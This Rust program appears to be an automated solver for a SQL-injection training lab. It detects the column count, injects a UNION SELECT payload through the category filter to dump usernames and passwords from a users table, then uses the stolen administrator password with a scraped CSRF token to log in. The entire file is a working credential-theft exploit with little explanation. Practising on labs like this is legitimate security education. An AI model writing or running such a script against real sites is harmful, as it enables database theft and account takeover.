use scraper::{Html, Selector};
use sql_injection::{
    HTTP_CLIENT, LOGIN_CSRF_TOKEN_SELECTOR, check_is_lab_solved, find_columns_of_type_string,
    find_no_of_columns, generate_clap_parser, get_csrf_token,
};
use std::{collections::HashMap, sync::LazyLock};

static TABLE_TH_SELECTOR: LazyLock<Selector> = LazyLock::new(|| {
    Selector::parse("table tbody tr th").expect("Failed to construct the TABLE_TH_SELECTOR")
});

fn main() {
    let args = generate_clap_parser();

    let lab_url = args.lab_url.as_str().trim_end_matches("/");
    let lab_url_with_endpoint = format!("{lab_url}/filter?category=");

    let columns = find_no_of_columns(&lab_url_with_endpoint, None);

    let target_columns = find_columns_of_type_string(&lab_url_with_endpoint, columns, None);

    logger::info("Fetching the `username` and `password` columns from `users` table");

    let payload = (0..columns)
        .map(|column| {
            if target_columns.contains(&column) {
                "username || ':' || password".to_string()
            } else {
                "NULL".to_string()
            }
        })
        .collect::<Vec<String>>()
        .join(", ");

    let query = format!("' UNION SELECT {} FROM users--", payload);

    logger::info(format!("Making query: {}/filter?category={}", lab_url, query).as_ref());

    let response = HTTP_CLIENT
        .get(format!("{}/filter?category={}", lab_url, query))
        .send()
        .expect("[-] Failed to fetch the `username` and `password` columns from `users` table");

    if response.status() == 200 {
        let document = Html::parse_document(
            response
                .text()
                .expect("[-] Failed to extract the body")
                .as_ref(),
        );

        let rows: Vec<String> = document
            .select(&TABLE_TH_SELECTOR)
            .flat_map(|element_ref| element_ref.text())
            .map(str::to_string)
            .collect();

        let users_hashmap: HashMap<String, String> = rows
            .into_iter()
            .filter_map(|row| {
                let mut parts = row.splitn(2, ':');

                match (parts.next(), parts.next()) {
                    (Some(username), Some(password)) => {
                        Some((username.to_string(), password.to_string()))
                    }
                    _ => None,
                }
            })
            .collect();

        logger::success("Credentials found in the `users` table:");

        println!();
        for (username, password) in users_hashmap.iter() {
            println!("{}:{}", username, password);
        }
        println!();

        if users_hashmap.contains_key("administrator") {
            logger::info("Now logging in as administrator");
            logger::info("Getting the login page CSRF TOKEN");

            // Making a GET request to the login page
            let response = HTTP_CLIENT
                .get(format!("{lab_url}/login"))
                .send()
                .expect("[-] Failed to fetch the login page");

            let login_page_csrf_token = get_csrf_token(
                response
                    .text()
                    .expect("[-] Failed to extract login page body")
                    .as_str(),
                &LOGIN_CSRF_TOKEN_SELECTOR,
            );

            logger::success(format!("Login Page CSRF Token: {}", login_page_csrf_token).as_ref());
            logger::info("Performing the login bypass");

            if HTTP_CLIENT
                .post(format!("{}/login", lab_url))
                .form(&[
                    ("csrf", login_page_csrf_token),
                    ("username", "administrator".to_string()),
                    (
                        "password",
                        users_hashmap.get("administrator").unwrap().to_string(),
                    ),
                ])
                .send()
                .expect("[-] Failed to login as administrator")
                .status()
                == 200
            {
                logger::success("Login succesfully as administrator");
            } else {
                logger::error("Failed to login as administrator");
            }
        } else {
            panic!(
                "{}",
                logger::error_return("administrator credential not found")
            );
        }
    } else {
        panic!(
            "{}",
            logger::error_return("Failed to fetch the usernames and passwords")
        );
    }

    check_is_lab_solved(lab_url);
}
